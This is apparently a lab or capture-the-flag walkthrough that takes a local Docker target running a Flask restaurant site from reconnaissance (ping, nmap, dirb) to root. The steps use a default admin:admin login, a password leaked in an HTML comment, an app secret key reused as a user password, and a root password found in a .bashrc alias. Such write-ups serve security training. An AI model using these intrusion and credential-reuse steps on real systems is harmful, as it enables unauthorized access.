# IP
172.17.0.2
# Recognition
```sh
ping -c 2 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.058 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.057/0.057/0.058/0.000 ms
```
# Ports scanning
```sh
sudo nmap -sS -sV -sC 172.17.0.2

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 69:15:7d:34:74:1c:21:8a:cb:2c:a2:8c:42:a4:21:7f (ECDSA)
|_  256 a7:3a:c9:b2:ac:cf:44:77:a7:9c:ab:89:98:c7:88:3f (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Restaurante Balulero - Inicio
```
# Dir Fuzzing
```sh
dirb http://172.17.0.2:5000 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Sep 14 19:03:31 2026
URL_BASE: http://172.17.0.2:5000/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.17.0.2:5000/ ----
+ http://172.17.0.2:5000/admin (CODE:302|SIZE:199)
+ http://172.17.0.2:5000/console (CODE:400|SIZE:167)
+ http://172.17.0.2:5000/login (CODE:200|SIZE:1850)
+ http://172.17.0.2:5000/logout (CODE:302|SIZE:189)

-----------------
END_TIME: Mon Sep 14 19:03:36 2026
DOWNLOADED: 4612 - FOUND: 4
```
# Admin panel
Could bypass admin login with username **admin** and password **admin**
# Hidden comment
```sh
curl -H "Cookie: session=eyJ1c3VhcmlvIjoiYWRtaW4ifQ.aqh0Tg.31oK4ocwhY2KGneKtMx48Lnuihs" -X GET http://172.17.0.2:5000/admin

<!-- Backup de acceso: sysadmin:backup123 -->
```
# SSH login
```sh
ssh sysadmin@172.17.0.2
password: backup123
sysadmin@29b08306d11e:~$
```

```sh
ls -la

drwx---r-- 4 sysadmin sysadmin  4096 Apr 29  2025 .
drwxr-xr-x 1 root     root      4096 Apr 29  2025 ..
-rw------- 1 sysadmin sysadmin    41 Apr 29  2025 .bash_history
-rw-r--r-- 1 sysadmin sysadmin   220 Apr 29  2025 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin  3526 Apr 29  2025 .bashrc
-rw-r--r-- 1 sysadmin sysadmin   807 Apr 29  2025 .profile
-rw-r--r-- 1 root     root      3809 Apr 29  2025 app.py
-rw-r--r-- 1 root     root     12288 Apr 29  2025 restaurant.db
drwxr-xr-x 3 root     root      4096 Apr 28  2025 static
drwxr-xr-x 2 root     root      4096 Apr 29  2025 templates
```

```sh
cat app.py

app.secret_key = 'cuidaditocuidadin'
```
# Privilege escalation
```sh
ls /home
balulero  sysadmin
``` 

```sh
su balulero
password: cuidaditocuidadin
```

```
cat .bash_history

nano ~/.bashrc
apt install nano -y
exit
nano ~/.bashrc
source nano ~/.bashrc
source ~/.bashrc
alias
su root
exit
```

```sh
cat .bashrc

alias ser-root='echo chocolate2 | su - root'
```

```sh
su - root
Password: chocolate2
root@29b08306d11e:~# whoami
root
```
